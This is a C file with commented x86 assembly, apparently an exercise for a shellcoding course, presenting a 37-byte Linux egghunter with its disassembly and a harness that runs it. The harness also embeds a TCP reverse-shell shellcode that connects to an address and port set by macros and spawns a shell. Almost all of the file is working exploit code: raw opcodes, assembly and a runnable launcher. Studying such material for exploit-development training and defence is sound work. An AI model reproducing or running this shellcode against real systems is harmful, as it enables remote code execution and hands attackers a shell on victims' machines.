/*

;
; Linux x86
; Author:  thryb
; Date:    02-08-16
; Purpose: Egghunter shellcode
; Size:    37 bytes
; ID:      SLAE-770
; Git:     https://www.github.com/thryb/SLAE-770
;

global _start
section .text

_start:

xor ebx, ebx ; cleanup
xor ecx, ecx ; cleanup

mem_align:
    or bx,0xfff         ; 0xfff
find_egg:
    inc ebx             ; 0x1000
    lea edx, [ebx+0x4]  ; load effective address of ebx+4
    push byte 0x21      ; sys_access()
    pop eax             ; pop sys_access() into eax
    int 0x80            ; init
                        ; #define EFAULT          14      // Bad address
    cmp al, 0xf2        ; EFAULT return FFFFFFF2 on unaccessible address
    jz mem_align        ; jmp to mem_align if pointer is invalid
    mov eax, 0x91919191 ; put the egg in eax
    mov edi, ebx        ; mov addres into edi
    scasd               ; compare eax / edi and increment edi by 4
    jnz find_egg        ; if not zero (not matched) try next address
    scasd               ; if zero (4bytes match) try the next 4
    jnz find_egg        ; if not zero (not matched) try next address
    jmp edi             ; jmmp to payload when everything is matched.;

============================================================================

No null

./aslr-egg.bin:     file format elf32-i386


Disassembly of section .text:

08048060 <_start>:
 8048060:       31 db                   xor    %ebx,%ebx
 8048062:       31 c9                   xor    %ecx,%ecx

08048064 <mem_align>:
 8048064:       66 81 cb ff 0f          or     $0xfff,%bx

08048069 <find_egg>:
 8048069:       43                      inc    %ebx
 804806a:       8d 53 04                lea    0x4(%ebx),%edx
 804806d:       6a 21                   push   $0x21
 804806f:       58                      pop    %eax
 8048070:       cd 80                   int    $0x80
 8048072:       3c f2                   cmp    $0xf2,%al
 8048074:       74 ee                   je     8048064 <mem_align>
 8048076:       b8 91 91 91 91          mov    $0x91919191,%eax
 804807b:       89 df                   mov    %ebx,%edi
 804807d:       af                      scas   %es:(%edi),%eax
 804807e:       75 e9                   jne    8048069 <find_egg>
 8048080:       af                      scas   %es:(%edi),%eax
 8048081:       75 e6                   jne    8048069 <find_egg>
 8048083:       ff e7                   jmp    *%edi


*/

#include <stdio.h>
#include <string.h>

#define EGG "\x91\x91\x91\x91"
#define IP "\x7f\xff\xff\xef"
#define PORT "\x23\x82"

unsigned char egghunter[] = \
		"\x31\xdb\x31\xc9\x66\x81\xcb\xff\x0f\x43\x8d\x53\x04\x6a\x21\x58\xcd\x80\x3c\xf2"
		"\x74\xee\xb8\x91\x91\x91\x91\x89\xdf\xaf\x75\xe9\xaf\x75\xe6\xff\xe7";

unsigned char code[] =  \
		EGG
		EGG
		"\x31\xf6" // added due to ESI being polluted after egghunter
		"\x31\xd2" // added due to EDX being polluted after egghunter
		// TCP Reverse shell 127.255.255.254:9090
		"\x31\xc0\x31\xdb\x50\x6a\x01\x6a\x02\xb0\x66\xb3\x01\x89\xe1\xcd\x80\x96\xb0\x66"
		"\x83\xc3\x02\x68"
		IP
		"\x66\x68"
		PORT
		"\x66\x6a\x02\x89\xe1\x6a\x10\x51"
		"\x56\x89\xe1\xcd\x80\x96\x31\xc9\x80\xc1\x02\xb0\x3f\xcd\x80\xfe\xc9\x79\xf8\x50"
		"\x68\x2f\x7a\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80";

int main()
{
	printf("Egghunter Length:  %d\n", strlen(egghunter));
	printf("Shellcode Length:  %d\n", strlen(code));
	int (*ret)() = (int(*)())egghunter;
	ret();
}

